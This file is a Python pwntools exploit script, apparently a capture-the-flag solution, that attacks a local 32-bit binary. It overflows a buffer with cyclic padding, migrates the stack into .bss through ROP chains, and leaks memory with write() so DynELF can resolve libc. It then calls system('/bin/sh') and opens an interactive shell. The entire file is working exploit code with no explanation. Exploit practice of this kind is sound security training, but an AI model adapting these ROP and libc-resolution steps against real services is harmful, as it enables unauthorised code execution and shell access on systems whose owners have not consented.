from pwn import *
from struct import *
import time


binary = './a.out'
p = process(binary)
# p = remote('localhost', 1234)

padding = cyclic(cyclic_find('baab'))
elf = ELF(binary)
addr_bss = elf.bss()
def _g():
    addr_bss_store = [elf.bss(0x100), elf.bss(0x200)]
    i = 0
    while True:
        yield addr_bss_store[i]
        i = (i + 1) & 1
g = _g()
cur_addr = g.next()
cmd = "/bin/sh\x00"
next_addr = g.next()

rop = ROP(elf)
rop.read(0, next_addr, 0x100)
rop.migrate(next_addr)
cur_addr = next_addr

payload = padding + str(rop)
p.sendline(payload)

time.sleep(5)
def leak(addr, length = 0x4):
    global g, p, elf, cur_addr
    next_addr = g.next()
    rop = ROP(elf)
    rop.write(1, addr, length)
    rop.read(0, next_addr, 0x100)
    rop.migrate(next_addr)
    payload = str(rop) + "\x41" * (0x100 - len(str(rop)))
    p.send(payload)
    data = p.recv()
    cur_addr = next_addr
    return data

resolver = DynELF(leak, elf=elf)
libc = resolver.libc

next_addr = g.next()
arg_addr  = next_addr + 12
rop = ROP(elf)
rop.read(0, next_addr, 12) #addr[system], AAAA, addr[/bin/sh\x00]
rop.read(0, arg_addr, 8) #*(arg_addr) -> /bin/sh\x00
rop.migrate(next_addr)

print rop.dump()
p.send(str(rop) + "A" * (0x100 - len(str(rop))))
p.send(pack("<I", libc.symbols['system']) + "AAAA" + pack("<I", arg_addr))
p.send("/bin/sh\x00")

p.interactive()
